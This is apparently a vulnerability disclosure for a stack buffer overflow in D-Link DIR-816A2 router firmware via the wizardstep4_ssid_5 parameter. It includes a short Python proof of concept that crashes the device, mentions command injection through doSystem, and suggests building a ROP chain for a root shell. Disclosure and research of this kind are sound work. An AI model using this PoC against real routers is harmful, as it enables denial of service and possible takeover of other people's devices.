# Affected Version

Dlink DIR-816A2\_FWv1.10CNB05.

# Vulnerability Description

Dlink DIR-816A2\_FWv1.10CNB05 was discovered to contain a stack overflow via parameter wizardstep4\_ssid\_5.

# Firmware download address

Manufacturer's address: <https://www.dlink.com/>

Firmware download address: [D-Link Technical Support (dlink.com.cn)](http://www.dlink.com.cn/techsupport/AllPro.aspx)

![image.png](https://note.youdao.com/yws/res/18518/WEBRESOURCEea363faad47f4978b40760dd3b47aacc)

# Vulnerability Details

From the following, we can see that there are two places where our input parameters wizardstep4\_ssid\_2 and wizardstep4\_ssid\_5 are written into v25 respectively, and there is no length limit. Every time we write our parameters to v25, we perform a doSystem operation, which allows for command injection through both parameters, as we mentioned in the previous article.

Here we focus on v19 and v20, which are respectively written into v25 without length restrictions, which can cause stack overflow. Due to repeated writes into a buffer, we have decided to cause overflow when v20 is written into v25.

![image.png](https://note.youdao.com/yws/res/18553/WEBRESOURCE2c8e154cb56ae2fbed689b71023c0cd1)

![image.png](https://note.youdao.com/yws/res/18556/WEBRESOURCE93b765ae455000466fe26437a72bd4f9)

# Recurring vulnerabilities and POC

```python
import requests

url = "http://192.168.1.25/goform/dir_setWanWifi"

data = {
    'connecttype':'DHCP',
    'statuscheckpppoeuser':'0',
    'wizardstep4_ssid_2':'123456',
    'wizardstep4_ssid_5':'a'*1000
}

response = requests.post(url,data=data)
```

The following is the result in gdb after sending POC:

Firstly, execute sprintf to write parameter A to v25, corresponding to the circled part in IDA:

![image.png](https://note.youdao.com/yws/res/18562/WEBRESOURCEdcf2a5fde25be47ec475f64286d63450)

![image.png](https://note.youdao.com/yws/res/18564/WEBRESOURCE6509ffee9752dcc10681fb112e013edf)

The result returned by sprintf is 0x3fe, indicating that our parameters were successfully written into v25.

![image.png](https://note.youdao.com/yws/res/18569/WEBRESOURCE73c4ac359ea610a28534d4b7f810213d)

Continuing with the following execution until the function reaches its end, it can be observed that the return address has been overwritten as' aaaa '.

![image.png](https://note.youdao.com/yws/res/18572/WEBRESOURCEea2b037dd598cb8bf8f7ad86bcc74f0c)

Continuing to run will cause the program to crash.

![image.png](https://note.youdao.com/yws/res/18577/WEBRESOURCE90ea7fc4dac3bbbb064d9f53d049f690)

Entering again will result in no response.

![image.png](https://note.youdao.com/yws/res/18580/WEBRESOURCE8b134ab355477db99cc0064c6b1c794d)

And you can write your own exp(ROP gadget) to get the root shell.
